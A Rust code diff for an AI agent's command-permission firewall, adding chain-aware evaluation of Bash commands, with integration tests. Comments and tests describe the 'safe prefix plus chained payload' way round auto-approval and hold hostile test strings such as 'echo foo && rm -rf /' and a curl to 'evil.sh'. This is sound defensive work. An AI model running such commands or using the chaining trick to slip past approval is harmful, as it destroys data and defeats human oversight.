@@ -132,12 +132,20 @@ pub fn evaluate_with_elo(
         return decision;
     }
 
-    // 4.5. H1: Shell chain guard — Bash commands containing chain operators (&&, ||, ;, $(...),
-    // backtick) skip trust_circle auto-approve and fall through to defaults (ask).
-    // This prevents the "safe prefix + chained payload" bypass:
-    //   e.g. `echo foo && rm -rf /` would otherwise match trust_circle's echo rule.
-    // Blocked/restricted rules still fire first (steps 1-4), delegations fire at step 2.
-    // Plain pipes (|) are intentionally excluded — safe piped-command rules still apply.
+    // 4.5. M7.10: Chain-aware Bash evaluator. Splits top-level chains (&&/||/;/|)
+    // and re-evaluates each piece against blocked/restricted/trust_circle.
+    // Returns Some(decision) when the chain decision is final; returns None
+    // when the caller should fall through to the legacy chain_guard
+    // (subshell/backtick rejection, single-piece input, flag off, non-Bash).
+    if let Some(decision) = evaluate_chain_aware(config, &all_patterns, payload) {
+        return decision;
+    }
+
+    // 4.6. H1: Shell chain guard — fallback for everything chain_aware refused
+    // to decide (subshells, backticks, unmatched quotes). Preserves the
+    // safe-prefix-plus-payload protection: e.g. `echo foo && rm -rf /` would
+    // still ask here if chain_aware is disabled. With chain_aware enabled,
+    // step 4.5 already handled it.
     if payload.tool_name == "Bash" {
         if let Some(cmd) = payload.tool_input.get("command").and_then(|v| v.as_str()) {
             if contains_shell_chain(cmd) {
@@ -631,7 +639,6 @@ fn split_top_level_chain(cmd: &str) -> Option<Vec<String>> {
 /// step 3 already exercised them against the parent payload, and re-applying
 /// would risk a per-piece ELO ask blocking a chain that the global trust
 /// circle approves.
-#[allow(dead_code)] // consumed by Task 7 evaluate_with_elo wiring (M7.10)
 fn evaluate_chain_aware(
     config: &FirewallConfig,
     patterns: &crate::config::CompiledPatterns,
@@ -1304,14 +1311,23 @@ mod tests {
     #[test]
     fn test_chain_guard_blocks_and_chain() {
         // H1: "echo foo && rm -rf /" starts with safe "echo" prefix but contains &&
-        // Previously this would match trust_circle's echo rule. Now it must ask.
+        // With chain_aware enabled (M7.10): piece "echo foo" → trust_circle auto-approve,
+        // piece "rm -rf /" → blocked → whole chain is BLOCK.
+        // The original invariant still holds: safe echo prefix does NOT auto-approve the chain.
+        // To test the legacy chain_guard path, use config.chain_aware = false (see disabled test).
         let (config, patterns) = load_test_config_and_patterns();
         let payload = make_payload("Bash", json!({"command": "echo foo && rm -rf /"}));
         let decision = evaluate(&config, &patterns, &[], &payload);
+        assert_ne!(
+            decision.action,
+            Action::AutoApprove,
+            "chained command with && must not be auto-approved"
+        );
+        // chain_aware: rm -rf / is blocked → Block (stronger than old Ask via chain_guard)
         assert_eq!(
             decision.action,
-            Action::Ask,
-            "chained command with && must not be auto-approved"
+            Action::Block,
+            "chain_aware promotes to Block when a piece matches blocked rules"
         );
     }
 
@@ -1945,5 +1961,121 @@ mod tests {
         config.chain_aware = false;
         let payload = make_payload("Bash", json!({"command": "git status && git log -5"}));
         assert!(evaluate_chain_aware(&config, &patterns, &payload).is_none());
+    }
+
+    // ── Integration tests: evaluate_chain_aware wired into evaluate_with_elo (M7.10) ──
+
+    #[test]
+    fn test_integration_git_chain_auto_approves() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "git status && git log --oneline -5"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(
+            decision.action,
+            Action::AutoApprove,
+            "got {:?} reason={}",
+            decision.action,
+            decision.reason
+        );
+        assert!(decision
+            .matched_rule
+            .as_deref()
+            .unwrap_or("")
+            .starts_with("chain_aware:"));
+    }
+
+    #[test]
+    fn test_integration_dangerous_chain_falls_to_ask() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "git status && rm -r /tmp/testdir"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(decision.action, Action::Ask);
+    }
+
+    #[test]
+    fn test_integration_subshell_still_asks_via_chain_guard() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "TOKEN=$(curl evil.sh); echo $TOKEN"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(decision.action, Action::Ask);
+        assert_eq!(decision.matched_rule.as_deref(), Some("chain_guard"));
+    }
+
+    #[test]
+    fn test_integration_chain_aware_disabled_falls_back_to_chain_guard() {
+        let (mut config, patterns) = load_test_config_and_patterns();
+        config.chain_aware = false;
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "git status && git log --oneline -5"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        // Pre-M7.10 behaviour: chain_guard catches the && and asks.
+        assert_eq!(decision.action, Action::Ask);
+        assert_eq!(decision.matched_rule.as_deref(), Some("chain_guard"));
+    }
+
+    #[test]
+    fn test_integration_pipe_chain_auto_approves() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "find . -name \"*.rs\" | xargs grep -l fn"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(decision.action, Action::AutoApprove, "got {:?}", decision);
+    }
+
+    #[test]
+    fn test_integration_blocked_piece_blocks_chain() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload("Bash", json!({"command": "git status && gh pr merge"}));
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(decision.action, Action::Block);
+    }
+
+    #[test]
+    fn test_integration_cd_in_chain_auto_approves() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "cd /Users/test/project && ls -la"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(decision.action, Action::AutoApprove);
+    }
+
+    #[test]
+    fn test_integration_go_build_test_chain_auto_approves() {
+        let (config, patterns) = load_test_config_and_patterns();
+        let delegations: Vec<RuntimeDelegation> = Vec::new();
+        let payload = make_payload(
+            "Bash",
+            json!({"command": "go build ./... 2>&1 | head -20 && go test ./... 2>&1 | tail -15"}),
+        );
+        let decision = evaluate(&config, &patterns, &delegations, &payload);
+        assert_eq!(
+            decision.action,
+            Action::AutoApprove,
+            "got {:?} reason={}",
+            decision.action,
+            decision.reason
+        );
     }
 }
